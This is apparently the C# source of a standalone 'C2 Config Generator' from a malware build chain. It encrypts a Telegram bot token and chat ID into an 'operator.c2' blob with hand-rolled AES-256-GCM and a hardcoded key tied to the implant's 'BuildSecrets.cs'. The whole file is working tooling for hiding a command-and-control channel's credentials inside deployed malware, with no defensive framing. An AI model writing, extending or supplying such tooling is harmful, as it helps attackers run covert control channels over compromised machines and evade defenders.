// gen_c2.cs — standalone generator for operator.c2 (AES-256-GCM blob)
// Compiles with: csc gen_c2.cs
// Usage: gen_c2.exe <bot_token> <chat_id> [output_path]
//
// Uses manual AES-GCM implementation (AES-ECB + GHASH) because
// BCrypt AES-GCM is not available on all Windows versions.

using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace C2Gen
{
    internal static class Program
    {
        // C2Key from BuildSecrets.cs — must match exactly
        private static readonly byte[] C2Key = new byte[32]
        {
            0x9E, 0x22, 0x4B, 0xC7, 0x68, 0xF1, 0x03, 0xAD,
            0x75, 0x18, 0xE4, 0x90, 0x3C, 0xB6, 0x52, 0xDF,
            0x11, 0x8A, 0x6D, 0x27, 0xCC, 0x49, 0xF8, 0x0E,
            0xBB, 0x34, 0x71, 0xA5, 0x5E, 0x96, 0x2F, 0x83
        };

        private static string ReadInput(string prompt)
        {
            Console.Write(prompt);
            return Console.ReadLine()?.Trim() ?? "";
        }

        private static int Main(string[] args)
        {
            string botToken, chatId, outputPath;

            if (args.Length >= 2)
            {
                botToken = args[0];
                chatId = args[1];
                outputPath = args.Length >= 3 ? args[2] : "operator.c2";
            }
            else if (args.Length == 1)
            {
                Console.WriteLine("=== C2 Config Generator ===");
                Console.WriteLine();
                botToken = ReadInput("  Bot token: ");
                chatId = ReadInput("  Chat ID:   ");
                outputPath = args[0];
            }
            else
            {
                Console.WriteLine("=== C2 Config Generator ===");
                Console.WriteLine();
                botToken = ReadInput("  Bot token: ");
                chatId = ReadInput("  Chat ID:   ");
                Console.WriteLine();
                outputPath = ReadInput("  Output path (Enter for operator.c2): ");
                if (string.IsNullOrEmpty(outputPath))
                    outputPath = "operator.c2";
            }

            if (string.IsNullOrEmpty(botToken) || string.IsNullOrEmpty(chatId))
            {
                Console.Error.WriteLine("[!] Bot token and chat ID are required.");
                return 1;
            }

            string plaintext = $"bot_token={botToken}\r\nchat_id={chatId}\r\n";
            byte[] plainBytes = Encoding.UTF8.GetBytes(plaintext);

            byte[] nonce = new byte[12];
            using (var rng = RandomNumberGenerator.Create())
                rng.GetBytes(nonce);

            byte[] ciphertext = new byte[plainBytes.Length];
            byte[] tag = new byte[16];

            GcmEncrypt(C2Key, nonce, plainBytes, null, ciphertext, tag);

            byte[] blob = new byte[12 + 16 + ciphertext.Length];
            Buffer.BlockCopy(nonce, 0, blob, 0, 12);
            Buffer.BlockCopy(tag, 0, blob, 12, 16);
            Buffer.BlockCopy(ciphertext, 0, blob, 28, ciphertext.Length);

            Directory.CreateDirectory(Path.GetDirectoryName(outputPath));
            File.WriteAllBytes(outputPath, blob);

            Console.WriteLine($"[+] Generated {outputPath} ({blob.Length} bytes)");
            Console.WriteLine($"    plaintext: {plaintext.TrimEnd()}");
            Console.WriteLine($"    nonce:     {BitConverter.ToString(nonce)}");
            Console.WriteLine($"    tag:       {BitConverter.ToString(tag)}");
            return 0;
        }

        static void GcmEncrypt(byte[] key, byte[] nonce, byte[] plaintext, byte[] aad, byte[] ciphertext, byte[] tag)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.Mode = CipherMode.ECB;
                aes.Padding = PaddingMode.None;
                ICryptoTransform enc = aes.CreateEncryptor();

                byte[] H = new byte[16];
                enc.TransformBlock(new byte[16], 0, 16, H, 0);

                byte[] J0 = new byte[16];
                Buffer.BlockCopy(nonce, 0, J0, 0, 12);
                J0[15] = 1;

                byte[] E0 = new byte[16];
                enc.TransformBlock(J0, 0, 16, E0, 0);

                byte[] counter = new byte[16];
                Buffer.BlockCopy(nonce, 0, counter, 0, 12);
                counter[15] = 2;

                byte[] E = new byte[16];
                int ptOff = 0;
                while (ptOff < plaintext.Length)
                {
                    enc.TransformBlock(counter, 0, 16, E, 0);
                    int chunk = Math.Min(16, plaintext.Length - ptOff);
                    for (int i = 0; i < chunk; i++)
                        ciphertext[ptOff + i] = (byte)(plaintext[ptOff + i] ^ E[i]);
                    ptOff += chunk;
                    Inc32(counter);
                }

                byte[] Y = new byte[16];
                if (aad != null && aad.Length > 0)
                {
                    int adOff = 0;
                    while (adOff < aad.Length)
                    {
                        int chunk = Math.Min(16, aad.Length - adOff);
                        for (int i = 0; i < chunk; i++) Y[i] ^= aad[adOff + i];
                        Gfmul(H, Y, Y);
                        adOff += chunk;
                    }
                    if (aad.Length % 16 != 0) Gfmul(H, Y, Y);
                }

                int ctOff = 0;
                while (ctOff < ciphertext.Length)
                {
                    int chunk = Math.Min(16, ciphertext.Length - ctOff);
                    for (int i = 0; i < chunk; i++) Y[i] ^= ciphertext[ctOff + i];
                    Gfmul(H, Y, Y);
                    ctOff += chunk;
                }

                byte[] lenBlock = new byte[16];
                ulong aadBits = (ulong)((aad?.Length ?? 0) * 8);
                ulong ctBits = (ulong)(ciphertext.Length * 8);
                if (BitConverter.IsLittleEndian)
                {
                    aadBits = SwapEndian(aadBits);
                    ctBits = SwapEndian(ctBits);
                }
                Array.Copy(BitConverter.GetBytes(aadBits), 0, lenBlock, 0, 8);
                Array.Copy(BitConverter.GetBytes(ctBits), 0, lenBlock, 8, 8);
                for (int i = 0; i < 16; i++) Y[i] ^= lenBlock[i];
                Gfmul(H, Y, Y);

                for (int i = 0; i < 16; i++) tag[i] = (byte)(Y[i] ^ E0[i]);

                enc.Dispose();
            }
        }

        static void Inc32(byte[] counter)
        {
            for (int i = 15; i >= 12; i--)
            {
                if (++counter[i] != 0) break;
            }
        }

        static ulong SwapEndian(ulong value)
        {
            byte[] b = BitConverter.GetBytes(value);
            Array.Reverse(b);
            return BitConverter.ToUInt64(b, 0);
        }

        static void Gfmul(byte[] H, byte[] X, byte[] output)
        {
            byte[] Z = new byte[16];
            byte[] V = new byte[16];
            Array.Copy(H, V, 16);

            for (int i = 0; i < 128; i++)
            {
                int byteIdx = i / 8;
                int bitIdx = 7 - (i % 8);
                bool xBit = (X[byteIdx] & (1 << bitIdx)) != 0;

                if (xBit)
                {
                    for (int j = 0; j < 16; j++) Z[j] ^= V[j];
                }

                bool lsb = (V[15] & 1) != 0;

                for (int j = 15; j > 0; j--)
                    V[j] = (byte)((V[j] >> 1) | (V[j - 1] << 7));
                V[0] >>= 1;

                if (lsb)
                {
                    V[0] ^= 0xE1;
                }
            }

            Array.Copy(Z, output, 16);
        }
    }
}
